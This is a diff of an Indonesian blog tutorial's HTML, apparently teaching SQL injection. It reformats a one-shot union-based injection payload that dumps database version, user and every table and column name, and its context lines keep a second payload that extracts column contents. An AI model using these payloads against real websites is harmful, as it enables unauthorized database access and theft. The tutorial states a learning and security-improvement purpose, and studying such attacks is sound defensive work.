@@ -14,7 +14,7 @@
 <meta property="og:description" content="Disclaimer:Disclaimer ini disengaja ditempatkan di bagian atas agar dibaca terlebih dahulu. Tujuan dari pembelajaran berikut adalah untuk keperluan pembelajaran dan peningkatan keamanan pada website s">
 <meta property="og:locale" content="id_ID">
 <meta property="article:published_time" content="2024-01-18T13:08:48.000Z">
-<meta property="article:modified_time" content="2024-01-18T13:14:31.261Z">
+<meta property="article:modified_time" content="2024-01-18T13:22:34.679Z">
 <meta property="article:author" content="R&amp;D ICWR">
 <meta property="article:tag" content="In Crust We Rush, Science, Social, Technology, BrotherHood">
 <meta name="twitter:card" content="summary">
@@ -184,9 +184,8 @@
 </ul>
 <p>Atau menggunakan metode Dump in One Shot SQL Injection:</p>
 <ul>
-<li>&#96;<a target="_blank" rel="noopener" href="http://contoh.com/get_name?id=-1">http://contoh.com/get_name?id=-1</a>‘ union select 1,concat(0x3c623e44756d7020696e204f6e652053686f743c2f623e3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,@c:&#x3D;0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e</li>
+<li><code>http://contoh.com/get_name?id=-1&#39; union select 1,concat(0x3c623e44756d7020696e204f6e652053686f743c2f623e3c62723e,version(),0x3c62723e,user(),0x3c62723e,database(),0x3c62723e,@c:=0x00,if((select count(*) from information_schema.columns where table_schema not like 0x696e666f726d6174696f6e5f736368656d61 and @c:=concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c),3--+-</code></li>
 </ul>
-<p>5f736368656d61 and @c:&#x3D;concat(@c,0x3c62723e,table_name,0x2e,column_name)),0x00,0x00),@c),3–+-&#96;</p>
 <p>Setelah mendapatkan nama kolom dari tabel, proses terakhir adalah menampilkan isi dari kolom pada table database. Misalnya, jika nama kolom ada 3 yaitu id, judul, detail, query untuk menampilkan isi dari kolom-kolom tersebut adalah:</p>
 <ul>
 <li><code>http://contoh.com/get_name?id=-1&#39; union select 1,group_concat(id,judul,detail),3 from nama_tabel --+-</code></li>
